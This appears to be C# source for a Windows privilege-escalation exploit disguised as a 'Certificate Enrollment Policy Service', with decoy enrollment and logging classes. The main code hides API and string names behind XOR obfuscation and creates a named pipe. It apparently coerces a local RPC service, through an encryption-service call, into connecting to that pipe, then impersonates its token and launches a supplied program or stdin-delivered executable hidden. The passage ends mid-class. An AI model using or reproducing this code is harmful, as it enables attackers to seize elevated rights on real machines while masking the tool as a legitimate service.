using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;
using System.IO;
using System.ComponentModel;
using System.Security.Permissions;
using System.Diagnostics;
using System.Threading;
using System.Security.Principal;
using System.Linq;
using Microsoft.Win32.SafeHandles;
using Microsoft.Win32;

namespace CertificateServices.Enrollment
{
    internal static class EnrollmentConstants
    {
        public const string ServiceDisplayName = "Certificate Enrollment Policy Service";
        public const string ServiceDescription  = "Provides Certificate Enrollment Policy to clients.";
        public const string EventSourceName     = "Microsoft-Windows-CertificateServicesClient-Enrollment";
        public const string CertStorePersonal   = "MY";
        public const string CertStoreMachine    = "LocalMachine";
        public const string PolicyServerVersion = "1.0.9200.0";
        public const string RpcProtocolSequence = "ncacn_np";
        public const string LocalEndpoint       = "localhost";
        public static readonly string[] SupportedAlgorithms = { "RSA", "ECDSA_P256", "ECDSA_P384" };
        public static readonly int[] KeySizes = { 1024, 2048, 4096 };
    }

    internal class CertificateRequestBuilder
    {
        private readonly string _subjectName;
        private readonly string _templateName;
        private int _keySize;

        public CertificateRequestBuilder(string subjectName, string templateName = "User", int keySize = 2048)
        {
            _subjectName  = subjectName;
            _templateName = templateName;
            _keySize      = keySize;
        }

        public string BuildSubjectDN()
        {
            return string.Format("CN={0},O=TESTLAB,C=US", _subjectName);
        }

        public bool ValidateKeySize()
        {
            return EnrollmentConstants.KeySizes.Contains(_keySize);
        }

        public string GetRequestXml()
        {
            var sb = new StringBuilder();
            sb.AppendLine("<CertificateRequest>");
            sb.AppendFormat("  <Subject>{0}</Subject>", BuildSubjectDN());
            sb.AppendLine();
            sb.AppendFormat("  <KeySize>{0}</KeySize>", _keySize);
            sb.AppendLine();
            sb.AppendFormat("  <Template>{0}</Template>", _templateName);
            sb.AppendLine();
            sb.AppendLine("</CertificateRequest>");
            return sb.ToString();
        }
    }

    internal static class EnrollmentLogger
    {
        private static readonly object _lock = new object();
        private static string _logPath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
            "Microsoft", "CertificateServices", "enrollment.log");

        public static void WriteInfo(string message)
        {
            try
            {
                lock (_lock)
                {
                    string entry = string.Format("[{0}] [INFO]  {1}", DateTime.UtcNow.ToString("o"), message);
                    File.AppendAllText(_logPath, entry + Environment.NewLine);
                }
            }
            catch { }
        }

        public static void WriteError(string message, Exception ex = null)
        {
            try
            {
                lock (_lock)
                {
                    string entry = string.Format("[{0}] [ERROR] {1}{2}",
                        DateTime.UtcNow.ToString("o"), message,
                        ex != null ? " :: " + ex.Message : string.Empty);
                    File.AppendAllText(_logPath, entry + Environment.NewLine);
                }
            }
            catch { }
        }

        public static void WriteAudit(string action, string subject, bool success)
        {
            WriteInfo(string.Format("AUDIT action={0} subject={1} result={2}",
                action, subject, success ? "SUCCESS" : "FAILURE"));
        }
    }

    internal static class RegistryHelper
    {
        private const string EnrollmentKeyPath =
            @"SOFTWARE\Microsoft\Cryptography\AutoEnrollment";
        private const string PolicyKeyPath =
            @"SOFTWARE\Policies\Microsoft\Cryptography\AutoEnrollment";

        public static int GetAEPolicy()
        {
            try
            {
                using (RegistryKey k = Registry.LocalMachine.OpenSubKey(PolicyKeyPath))
                    if (k != null) return (int)(k.GetValue("AEPolicy", 0));
            }
            catch { }
            return 0;
        }

        public static string GetCEPUrl()
        {
            try
            {
                using (RegistryKey k = Registry.LocalMachine.OpenSubKey(EnrollmentKeyPath))
                    if (k != null) return k.GetValue("PolicyServerUrl", string.Empty) as string;
            }
            catch { }
            return string.Empty;
        }
    }

    #region api resolution
    internal static class X
    {
        [DllImport("kernel32", EntryPoint = "GetModuleHandleW", CharSet = CharSet.Unicode)]
        static extern IntPtr G(string m);
        [DllImport("kernel32", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi, ExactSpelling = true)]
        static extern IntPtr P(IntPtr h, string p);

        internal static byte[] D(byte[] b)
        {
            var r = new byte[b.Length];
            for (int i = 0; i < b.Length; i++) r[i] = (byte)(b[i] ^ (byte)(0xA3 + i * 0x5B));
            return r;
        }
        internal static string S(byte[] b)
        {
            var r = new byte[b.Length];
            for (int i = 0; i < b.Length; i++) r[i] = (byte)(b[i] ^ (byte)(0xA3 + i * 0x5B));
            return Encoding.UTF8.GetString(r);
        }
        static T R<T>(IntPtr h, string p)
        {
            return (T)(object)Marshal.GetDelegateForFunctionPointer(P(h, p), typeof(T));
        }

        // MIDL stubs
        internal static readonly byte[] _mps86 = new byte[] { 0xa3, 0xfe, 0x59, 0xfc, 0x0f, 0x6a, 0xc5, 0x20, 0x7f, 0xd6, 0x3d, 0x8c, 0xd5, 0x42, 0x9d, 0xf8, 0x53, 0xae, 0x01, 0x64, 0xf9, 0x18, 0x7d, 0xd1, 0x2b, 0x86, 0xe1, 0x3c, 0x97, 0xf2, 0x46, 0xa9, 0x07, 0x5e, 0xb5, 0x14, 0x1f, 0xca, 0x2d, 0x80, 0xd3, 0x36 };
        internal static readonly byte[] _mps64 = new byte[] { 0xa3, 0xfe, 0x59, 0xfc, 0x0f, 0x6a, 0xc5, 0x20, 0x7f, 0xd6, 0x29, 0x8c, 0xd5, 0x42, 0x9d, 0xf8, 0x53, 0xae, 0x01, 0x64, 0xf9, 0x18, 0x7f, 0x91, 0x2b, 0x86, 0xe1, 0x3c, 0x97, 0xf2, 0x4d, 0xa8, 0x08, 0x5f, 0xb1, 0x14, 0x63, 0xca, 0x55, 0x80, 0xcb, 0x36, 0x99, 0xec };
        internal static readonly byte[] _mts86 = new byte[] { 0xa3, 0xfe, 0x59, 0xb4, 0x1e, 0x6e, 0xc7, 0x20, 0x4b, 0x76, 0x31, 0x8c, 0xf6, 0x4a, 0xb8, 0xa4, 0x53, 0xae };
        internal static readonly byte[] _mts64 = new byte[] { 0xa3, 0xfe, 0x59, 0xb4, 0x1e, 0x6e, 0xc7, 0x20, 0x4b, 0x76, 0x31, 0x8c, 0xf6, 0x4a, 0xb8, 0xa4, 0x53, 0xae };
        // strings
        internal static readonly byte[] _priv = new byte[] { 0xf0, 0x9b, 0x10, 0xd9, 0x7f, 0x0f, 0xb7, 0x53, 0x14, 0xb8, 0x50, 0xf8, 0x82, 0x12, 0xef, 0x91, 0x25, 0xc7, 0x65, 0x01, 0xd8, 0x7f };
        internal static readonly byte[] _desk = new byte[] { 0xf4, 0x97, 0x37, 0xe7, 0x7b, 0x0b, 0xf5, 0x7c, 0x3f, 0xb3, 0x57, 0xed, 0x92, 0x2e, 0xe9 };
        internal static readonly byte[] _lpipe = new byte[] { 0xff, 0xa2, 0x35, 0xdb, 0x6c, 0x0b, 0xa9, 0x48, 0x14, 0xa5, 0x45, 0xa3, 0xb7, 0x0b, 0xcd, 0xbd, 0x7c };
        internal static readonly byte[] _ep1 = new byte[] { 0xcf, 0x8d, 0x38, 0xc6, 0x7f, 0x09 };
        internal static readonly byte[] _ep2 = new byte[] { 0xc6, 0x98, 0x2a, 0xc6, 0x7f, 0x09 };
        internal static readonly byte[] _ep3 = new byte[] { 0xd0, 0x9f, 0x34, 0xc6 };
        internal static readonly byte[] _ep4 = new byte[] { 0xcf, 0x8d, 0x38, 0xc7, 0x7c };
        internal static readonly byte[] _ep5 = new byte[] { 0xcd, 0x9b, 0x2d, 0xd8, 0x60, 0x0d, 0xaa, 0x4e };
        internal static readonly byte[] _ncnp = new byte[] { 0xcd, 0x9d, 0x38, 0xd7, 0x61, 0x35, 0xab, 0x50 };
        internal static readonly byte[] _g1 = new byte[] { 0xc0, 0xc8, 0x61, 0x85, 0x6b, 0x5e, 0xfd, 0x18, 0x56, 0xb2, 0x09, 0xb9, 0xd7, 0x6f, 0xac, 0xc9, 0x37, 0x9e, 0x24, 0x5c, 0xdc, 0x2f, 0x47, 0xfd, 0x1b, 0xb6, 0x82, 0x0c, 0xa3, 0x94, 0x29, 0x91, 0x33, 0x38, 0x8e, 0x71 };
        internal static readonly byte[] _g2 = new byte[] { 0xc7, 0x98, 0x68, 0x8d, 0x3b, 0x5b, 0xa6, 0x15, 0x56, 0xb0, 0x54, 0xb4, 0xde, 0x6f, 0xa9, 0x9d, 0x64, 0x97, 0x24, 0x06, 0xd9, 0x2b, 0x45, 0xfd, 0x1f, 0xb0, 0xd2, 0x0a, 0xa2, 0xc5, 0x2c, 0xcb, 0x65, 0x6a, 0x8d, 0x70 };
        internal static readonly byte[] _lh = new byte[] { 0xcf, 0x91, 0x3a, 0xd5, 0x63, 0x02, 0xaa, 0x53, 0x0f };
        // DLL names
        internal static readonly byte[] _k32 = new byte[] { 0xc8, 0x9b, 0x2b, 0xda, 0x6a, 0x06, 0xf6, 0x12, 0x55, 0xb2, 0x5d, 0xe0 };
        internal static readonly byte[] _adv = new byte[] { 0xc2, 0x9a, 0x2f, 0xd5, 0x7f, 0x03, 0xf6, 0x12, 0x55, 0xb2, 0x5d, 0xe0 };
        internal static readonly byte[] _rpc = new byte[] { 0xf1, 0x8e, 0x3a, 0xc6, 0x7b, 0x5e, 0xeb, 0x44, 0x17, 0xba };
        // API names
        static readonly byte[] _fn_ll = new byte[] { 0xef, 0x91, 0x38, 0xd0, 0x43, 0x03, 0xa7, 0x52, 0x1a, 0xa4, 0x48, 0xdb };
        static readonly byte[] _fn_gsh = new byte[] { 0xe4, 0x9b, 0x2d, 0xe7, 0x7b, 0x0e, 0x8d, 0x41, 0x15, 0xb2, 0x5d, 0xe9 };
        static readonly byte[] _fn_gft = new byte[] { 0xe4, 0x9b, 0x2d, 0xf2, 0x66, 0x06, 0xa0, 0x74, 0x02, 0xa6, 0x54 };
        static readonly byte[] _fn_cfw = new byte[] { 0xe0, 0x8c, 0x3c, 0xd5, 0x7b, 0x0f, 0x83, 0x49, 0x17, 0xb3, 0x66 };
        static readonly byte[] _fn_cnpw = new byte[] { 0xe0, 0x8c, 0x3c, 0xd5, 0x7b, 0x0f, 0x8b, 0x41, 0x16, 0xb3, 0x55, 0xdc, 0x8e, 0x32, 0xf8, 0xaf };
        static readonly byte[] _fn_cnp = new byte[] { 0xe0, 0x91, 0x37, 0xda, 0x6a, 0x09, 0xb1, 0x6e, 0x1a, 0xbb, 0x54, 0xe8, 0xb7, 0x2b, 0xed, 0x9d };
        static readonly byte[] _fn_inp = new byte[] { 0xea, 0x93, 0x29, 0xd1, 0x7d, 0x19, 0xaa, 0x4e, 0x1a, 0xa2, 0x54, 0xc2, 0x86, 0x2f, 0xf8, 0x9c, 0x03, 0xc7, 0x79, 0x01, 0xfc, 0x76, 0x1c, 0xb5, 0x45, 0xf2 };
        static readonly byte[] _fn_ch = new byte[] { 0xe0, 0x92, 0x36, 0xc7, 0x6a, 0x22, 0xa4, 0x4e, 0x1f, 0xba, 0x54 };
        static readonly byte[] _fn_atp = new byte[] { 0xe2, 0x9a, 0x33, 0xc1, 0x7c, 0x1e, 0x91, 0x4f, 0x10, 0xb3, 0x5f, 0xdc, 0x95, 0x2b, 0xeb, 0x91, 0x3f, 0xcb, 0x6e, 0x01, 0xcc };
        static readonly byte[] _fn_lpv = new byte[] { 0xef, 0x91, 0x36, 0xdf, 0x7a, 0x1a, 0x95, 0x52, 0x12, 0xa0, 0x58, 0xe0, 0x82, 0x25, 0xf8, 0xae, 0x32, 0xc2, 0x7c, 0x01, 0xe8 };
        static readonly byte[] _fn_cp = new byte[] { 0xe0, 0x8c, 0x3c, 0xd5, 0x7b, 0x0f, 0x95, 0x49, 0x0b, 0xb3 };
        static readonly byte[] _fn_cpau = new byte[] { 0xe0, 0x8c, 0x3c, 0xd5, 0x7b, 0x0f, 0x95, 0x52, 0x14, 0xb5, 0x54, 0xff, 0x94, 0x03, 0xee, 0xad, 0x20, 0xcb, 0x7b, 0x33 };
        static readonly byte[] _fn_rbfsb = new byte[] { 0xf1, 0x8e, 0x3a, 0xf6, 0x66, 0x04, 0xa1, 0x49, 0x15, 0xb1, 0x77, 0xfe, 0x88, 0x2f, 0xce, 0x8c, 0x21, 0xc7, 0x67, 0x03, 0xfd, 0x73, 0x1b, 0xb4, 0x42, 0xe8, 0x86, 0x6b };
        static readonly byte[] _fn_rbsai = new byte[] { 0xf1, 0x8e, 0x3a, 0xf6, 0x66, 0x04, 0xa1, 0x49, 0x15, 0xb1, 0x62, 0xe9, 0x93, 0x03, 0xe8, 0x8c, 0x3b, 0xe7, 0x67, 0x02, 0xd0, 0x4d };
        static readonly byte[] _fn_ncc2 = new byte[] { 0xed, 0x9a, 0x2b, 0xf7, 0x63, 0x03, 0xa0, 0x4e, 0x0f, 0x95, 0x50, 0xe0, 0x8b, 0x70 };
        static readonly byte[] _fn_rbf = new byte[] { 0xf1, 0x8e, 0x3a, 0xf6, 0x66, 0x04, 0xa1, 0x49, 0x15, 0xb1, 0x77, 0xfe, 0x82, 0x27 };
        static readonly byte[] _fn_rsbcw = new byte[] { 0xf1, 0x8e, 0x3a, 0xe7, 0x7b, 0x18, 0xac, 0x4e, 0x1c, 0x94, 0x58, 0xe2, 0x83, 0x2b, 0xf3, 0x9f, 0x10, 0xc1, 0x64, 0x14, 0xd0, 0x69, 0x10, 0x87 };
        static readonly byte[] _fn_rbso = new byte[] { 0xf1, 0x8e, 0x3a, 0xf6, 0x66, 0x04, 0xa1, 0x49, 0x15, 0xb1, 0x62, 0xe9, 0x93, 0x0d, 0xed, 0x8c, 0x3a, 0xc1, 0x67 };

        // delegate types — kernel32
        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        internal delegate IntPtr D_LoadLibrary(string lp);
        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        internal delegate IntPtr D_GetStdHandle(int h);
        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        internal delegate int D_GetFileType(IntPtr h);
        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
        internal delegate IntPtr D_CreateFile(string lpFileName, int access, int share, IntPtr sa, int cd, int flag, IntPtr zero);
        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
        internal delegate IntPtr D_CreateNamedPipe(string name, int i1, int i2, int i3, int i4, int i5, int i6, IntPtr zero);
        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        internal delegate IntPtr D_ConnectNamedPipe(IntPtr pipe, IntPtr zero);
        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        internal delegate bool D_CloseHandle(IntPtr handle);
        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        internal delegate bool D_CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, int nSize);
        // delegate types — advapi32
        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        internal delegate bool D_ImpersonateNamedPipeClient(IntPtr pipe);
        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        internal delegate bool D_AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, int Bufferlength, IntPtr PreviousState, IntPtr ReturnLength);
        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
        internal delegate bool D_LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);
        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
        internal delegate bool D_CreateProcessAsUser(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, int dwCreationFlags, IntPtr lpEnvironment, IntPtr lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        // delegate types — Rpcrt4
        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        internal delegate Int32 D_RpcBindingFromStringBinding(String bindingString, out IntPtr lpBinding);
        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        internal delegate Int32 D_RpcBindingSetAuthInfo(IntPtr lpBinding, string ServerPrincName, UInt32 AuthnLevel, UInt32 AuthnSvc, IntPtr AuthIdentity, UInt32 AuthzSvc);
        [UnmanagedFunctionPointer(CallingConvention.Cdecl, CharSet = CharSet.Unicode)]
        internal delegate IntPtr D_NdrClientCall2x86(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr args);
        [UnmanagedFunctionPointer(CallingConvention.Cdecl, CharSet = CharSet.Unicode)]
        internal delegate IntPtr D_NdrClientCall2x64(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr binding, string FileName);
        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        internal delegate Int32 D_RpcBindingFree(ref IntPtr lpString);
        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        internal delegate Int32 D_RpcStringBindingCompose(String ObjUuid, String ProtSeq, String NetworkAddr, String Endpoint, String Options, out IntPtr lpBindingString);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        internal delegate Int32 D_RpcBindingSetOption(IntPtr Binding, UInt32 Option, IntPtr OptionValue);

        // resolved delegate fields
        internal static D_GetStdHandle pfGetStdHandle;
        internal static D_GetFileType pfGetFileType;
        internal static D_CreateFile pfCreateFile;
        internal static D_CreateNamedPipe pfCreateNamedPipe;
        internal static D_ConnectNamedPipe pfConnectNamedPipe;
        internal static D_CloseHandle pfCloseHandle;
        internal static D_CreatePipe pfCreatePipe;
        internal static D_ImpersonateNamedPipeClient pfImpersonateNamedPipeClient;
        internal static D_AdjustTokenPrivileges pfAdjustTokenPrivileges;
        internal static D_LookupPrivilegeValue pfLookupPrivilegeValue;
        internal static D_CreateProcessAsUser pfCreateProcessAsUser;
        internal static D_RpcBindingFromStringBinding pfRpcBindingFromStringBinding;
        internal static D_RpcBindingSetAuthInfo pfRpcBindingSetAuthInfo;
        internal static D_NdrClientCall2x86 pfNdrClientCall2x86;
        internal static D_NdrClientCall2x64 pfNdrClientCall2x64;
        internal static D_RpcBindingFree pfRpcBindingFree;
        internal static D_RpcStringBindingCompose pfRpcStringBindingCompose;
        internal static D_RpcBindingSetOption pfRpcBindingSetOption;

        internal static void Init()
        {
            IntPtr hK32 = G(S(_k32));
            var pfLoadLib = R<D_LoadLibrary>(hK32, S(_fn_ll));
            IntPtr hAdv = pfLoadLib(S(_adv));
            IntPtr hRpc = pfLoadLib(S(_rpc));
            pfGetStdHandle = R<D_GetStdHandle>(hK32, S(_fn_gsh));
            pfGetFileType = R<D_GetFileType>(hK32, S(_fn_gft));
            pfCreateFile = R<D_CreateFile>(hK32, S(_fn_cfw));
            pfCreateNamedPipe = R<D_CreateNamedPipe>(hK32, S(_fn_cnpw));
            pfConnectNamedPipe = R<D_ConnectNamedPipe>(hK32, S(_fn_cnp));
            pfCloseHandle = R<D_CloseHandle>(hK32, S(_fn_ch));
            pfCreatePipe = R<D_CreatePipe>(hK32, S(_fn_cp));
            pfImpersonateNamedPipeClient = R<D_ImpersonateNamedPipeClient>(hAdv, S(_fn_inp));
            pfAdjustTokenPrivileges = R<D_AdjustTokenPrivileges>(hAdv, S(_fn_atp));
            pfLookupPrivilegeValue = R<D_LookupPrivilegeValue>(hAdv, S(_fn_lpv));
            pfCreateProcessAsUser = R<D_CreateProcessAsUser>(hAdv, S(_fn_cpau));
            pfRpcBindingFromStringBinding = R<D_RpcBindingFromStringBinding>(hRpc, S(_fn_rbfsb));
            pfRpcBindingSetAuthInfo = R<D_RpcBindingSetAuthInfo>(hRpc, S(_fn_rbsai));
            pfNdrClientCall2x86 = R<D_NdrClientCall2x86>(hRpc, S(_fn_ncc2));
            pfNdrClientCall2x64 = R<D_NdrClientCall2x64>(hRpc, S(_fn_ncc2));
            pfRpcBindingFree = R<D_RpcBindingFree>(hRpc, S(_fn_rbf));
            pfRpcStringBindingCompose = R<D_RpcStringBindingCompose>(hRpc, S(_fn_rsbcw));
            pfRpcBindingSetOption = R<D_RpcBindingSetOption>(hRpc, S(_fn_rbso));
        }
    }
    #endregion

    class CertEnrollmentAgent
    {
        const int STD_INPUT_HANDLE = -10;
        const int FILE_TYPE_PIPE   = 3;

        static void ReadFull(Stream s, byte[] buf, int count)
        {
            int offset = 0;
            while (offset < count)
            {
                int n = s.Read(buf, offset, count - offset);
                if (n == 0) throw new EndOfStreamException();
                offset += n;
            }
        }

        static void Main(string[] args)
        {
            X.Init();

            string targetCmdLine = null;
            string tempFilePath  = null;

            IntPtr hStdin = X.pfGetStdHandle(STD_INPUT_HANDLE);
            if (X.pfGetFileType(hStdin) == FILE_TYPE_PIPE)
            {
                try
                {
                    Stream s = Console.OpenStandardInput();
                    byte[] hdr = new byte[4];
                    ReadFull(s, hdr, 4);
                    int peSize = BitConverter.ToInt32(hdr, 0);
                    byte[] peBytes = new byte[peSize];
                    ReadFull(s, peBytes, peSize);
                    tempFilePath  = Path.GetTempFileName();
                    File.WriteAllBytes(tempFilePath, peBytes);
                    targetCmdLine = tempFilePath;
                }
                catch { return; }
            }
            else
            {
                if (args.Length < 1) return;
                targetCmdLine = args[0];
            }

            string ep1 = X.S(X._ep1), ep2 = X.S(X._ep2), ep3 = X.S(X._ep3), ep4 = X.S(X._ep4), ep5 = X.S(X._ep5);
            string endpoint = ep1;
            if (args.Length >= 2)
            {
                if ((new List<string> { ep1, ep2, ep3, ep4, ep5 }).Contains(args[1], StringComparer.OrdinalIgnoreCase))
                {
                    endpoint = args[1];
                }
                else
                {
                    return;
                }
            }

            LUID_AND_ATTRIBUTES[] l = new LUID_AND_ATTRIBUTES[1];
            using (WindowsIdentity wi = WindowsIdentity.GetCurrent())
            {
                X.pfLookupPrivilegeValue(null, X.S(X._priv), out l[0].Luid);
                TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
                tp.PrivilegeCount = 1;
                tp.Privileges = l;
                l[0].Attributes = 2;
                if (!X.pfAdjustTokenPrivileges(wi.Token, false, ref tp, Marshal.SizeOf(tp), IntPtr.Zero, IntPtr.Zero) || Marshal.GetLastWin32Error() != 0)
                {
                    return;
                }
            }
            string g = Guid.NewGuid().ToString("d");
            string pipePath = @"\\.\pipe\" + g + @"\pipe\srvsvc";
            var hChannel = X.pfCreateNamedPipe(pipePath, 3, 0, 10, 2048, 2048, 0, IntPtr.Zero);
            if (hChannel == new IntPtr(-1))
            {
                return;
            }
            ManualResetEvent mre = new ManualResetEvent(false);
            var t1 = new Thread(ListenServicePipe);
            t1.IsBackground = true;
            t1.Start(new object[] { hChannel, mre });
            var t2 = new Thread(EstablishRpcChannel);
            t2.IsBackground = true;
            t2.Start(new object[] { g, endpoint });
            if (mre.WaitOne(3000))
            {
                if (X.pfImpersonateNamedPipeClient(hChannel))
                {
                    IntPtr tkn = WindowsIdentity.GetCurrent().Token;
                    SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
                    sa.nLength = Marshal.SizeOf(sa);
                    sa.pSecurityDescriptor = IntPtr.Zero;
                    sa.bInheritHandle = 1;
                    IntPtr hRead, hWrite;
                    X.pfCreatePipe(out hRead, out hWrite, ref sa, 1024);
                    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                    STARTUPINFO si = new STARTUPINFO();
                    si.cb = Marshal.SizeOf(si);
                    si.hStdError = hWrite;
                    si.hStdOutput = hWrite;
                    si.lpDesktop = X.S(X._desk);
                    si.dwFlags = 0x101;
                    si.wShowWindow = 0;
                    if (X.pfCreateProcessAsUser(tkn, null, targetCmdLine, IntPtr.Zero, IntPtr.Zero, true, 0x08000000, IntPtr.Zero, IntPtr.Zero, ref si, out pi))
                    {
                        t1 = new Thread(ProcessOutputStream);
                        t1.IsBackground = true;
                        t1.Start(hRead);
                        new ProcessWaitHandle(new SafeWaitHandle(pi.hProcess, false)).WaitOne(-1);
                        t1.Abort();
                        if (tempFilePath != null)
                        {
                            try { File.Delete(tempFilePath); } catch { }
                        }
                        X.pfCloseHandle(pi.hProcess);
                        X.pfCloseHandle(pi.hThread);
                        X.pfCloseHandle(tkn);
                        X.pfCloseHandle(hWrite);
                        X.pfCloseHandle(hRead);
                    }
                }
            }
            else
            {
                X.pfCreateFile(pipePath, 1073741824, 0, IntPtr.Zero, 3, 0x80, IntPtr.Zero);
            }
            X.pfCloseHandle(hChannel);
        }

        static void ProcessOutputStream(object o)
        {
            IntPtr p = (IntPtr)o;
            FileStream fs = new FileStream(p, FileAccess.Read, false);
            StreamReader sr = new StreamReader(fs, Console.OutputEncoding);
            while (true)
            {
                string s = sr.ReadLine();
                if (s == null) { break; }
            }
        }

        static void EstablishRpcChannel(object o)
        {
            object[] objs = o as object[];
            string g = objs[0] as string;
            string p = objs[1] as string;
            RpcServiceClient r = new RpcServiceClient(p);
            try
            {
                string h = X.S(X._lpipe);
                r.InvokeEncryptionService(h + g + "/\\" + g + "\\" + g);
            }
            catch (Exception)
            {
            }
        }

        static void ListenServicePipe(object o)
        {
            object[] objs = o as object[];
            IntPtr pipe = (IntPtr)objs[0];
            ManualResetEvent mre = objs[1] as ManualResetEvent;
            if (mre != null)
            {
                X.pfConnectNamedPipe(pipe, IntPtr.Zero);
                mre.Set();
            }
        }
    }

    internal class ProcessWaitHandle : WaitHandle
    {
        internal ProcessWaitHandle(SafeWaitHandle processHandle)
        {
            base.SafeWaitHandle = processHandle;
        }
    }

    class RpcServiceClient
    {
        Guid interfaceId;
        public RpcServiceClient(string pipe)
        {
            string g1 = X.S(X._g1);
            string g2 = X.S(X._g2);
            IDictionary<string, string> endpointMap = new Dictionary<string, string>()
            {
                {X.S(X._ep1), g1},
                {X.S(X._ep2), g2},
                {X.S(X._ep3), g1},
                {X.S(X._ep4), g1},
                {X.S(X._ep5), g1}
            };
            interfaceId = new Guid(endpointMap[pipe]);
            pipe = String.Format("\\pipe\\{0}", pipe);
            if (IntPtr.Size == 8)
                InitializeStub(interfaceId, X.D(X._mps64), X.D(X._mts64), pipe, 1, 0);
            else
                InitializeStub(interfaceId, X.D(X._mps86), X.D(X._mts86), pipe, 1, 0);
        }

        ~RpcServiceClient()
        {
            freeStub();
        }

        public int InvokeEncryptionService(string FileName)
        {
            IntPtr result = IntPtr.Zero;
            IntPtr pfn = Marshal.StringToHGlobalUni(FileName);
            try
            {
                if (IntPtr.Size == 8)
                    result = X.pfNdrClientCall2x64(GetStubHandle(), GetProcStringHandle(2), Bind(Marshal.StringToHGlobalUni(X.S(X._lh))), FileName);
                else
                    result = CallNdrClientCall2x86(2, Bind(Marshal.StringToHGlobalUni(X.S(X._lh))), pfn);
            }
            catch (SEHException)
            {
                return Marshal.GetExceptionCode();
            }
            finally
            {
                if (pfn != IntPtr.Zero)
                    Marshal.FreeHGlobal(pfn);
            }
            return (int)result.ToInt64();
        }

        private byte[] MIDL_ProcFormatString;
        private byte[] MIDL_TypeFormatString;
        private GCHandle procString;
        private GCHandle formatString;
        private GCHandle stub;
        private GCHandle faultoffsets;
        private GCHandle clientinterface;
        private string PipeName;

        allocmemory AllocateMemoryDelegate = AllocateMemory;
        freememory FreeMemoryDelegate = FreeMemory;
        public UInt32 RPCTimeOut = 5000;

        protected void InitializeStub(Guid interfaceID, byte[] MIDL_ProcFormatString, byte[] MIDL_TypeFormatString, string pipe, ushort MajorVerson, ushort MinorVersion)
        {
            this.MIDL_ProcFormatString = MIDL_ProcFormatString;
            this.MIDL_TypeFormatString = MIDL_TypeFormatString;
            PipeName = pipe;
            procString = GCHandle.Alloc(this.MIDL_ProcFormatString, GCHandleType.Pinned);
            RPC_CLIENT_INTERFACE clientinterfaceObject = new RPC_CLIENT_INTERFACE(interfaceID, MajorVerson, MinorVersion);
            COMM_FAULT_OFFSETS commFaultOffset = new COMM_FAULT_OFFSETS();
            commFaultOffset.CommOffset = -1;
            commFaultOffset.FaultOffset = -1;
            faultoffsets = GCHandle.Alloc(commFaultOffset, GCHandleType.Pinned);
            clientinterface = GCHandle.Alloc(clientinterfaceObject, GCHandleType.Pinned);
            formatString = GCHandle.Alloc(MIDL_TypeFormatString, GCHandleType.Pinned);
            MIDL_STUB_DESC stubObject = new MIDL_STUB_DESC(formatString.AddrOfPinnedObject(),
                                                            clientinterface.AddrOfPinnedObject(),
                                                            Marshal.GetFunctionPointerForDelegate(AllocateMemoryDelegate),
                                                            Marshal.GetFunctionPointerForDelegate(FreeMemoryDelegate));
            stub = GCHandle.Alloc(stubObject, GCHandleType.Pinned);
        }

        protected void freeStub()
        {
            procString.Free();
            faultoffsets.Free();
            clientinterface.Free();
            formatString.Free();
            stub.Free();
        }

        delegate IntPtr allocmemory(int size);
        protected static IntPtr AllocateMemory(int size) { return Marshal.AllocHGlobal(size); }
        delegate void freememory(IntPtr memory);
        protected static void FreeMemory(IntPtr memory) { Marshal.FreeHGlobal(memory); }

        protected IntPtr Bind(IntPtr IntPtrserver)
        {
            string server = Marshal.PtrToStringUni(IntPtrserver);
            IntPtr bindingstring = IntPtr.Zero;
            IntPtr binding = IntPtr.Zero;
            Int32 status;
            status = X.pfRpcStringBindingCompose(interfaceId.ToString(), X.S(X._ncnp), server, PipeName, null, out bindingstring);
            if (status != 0) return IntPtr.Zero;
            status = X.pfRpcBindingFromStringBinding(Marshal.PtrToStringUni(bindingstring), out binding);
            X.pfRpcBindingFree(ref bindingstring);
            if (status != 0) return IntPtr.Zero;
            X.pfRpcBindingSetAuthInfo(binding, server, 6, 9, IntPtr.Zero, 16);
            X.pfRpcBindingSetOption(binding, 12, new IntPtr(RPCTimeOut));
            return binding;
        }

        protected IntPtr GetProcStringHandle(int offset) { return Marshal.UnsafeAddrOfPinnedArrayElement(MIDL_ProcFormatString, offset); }
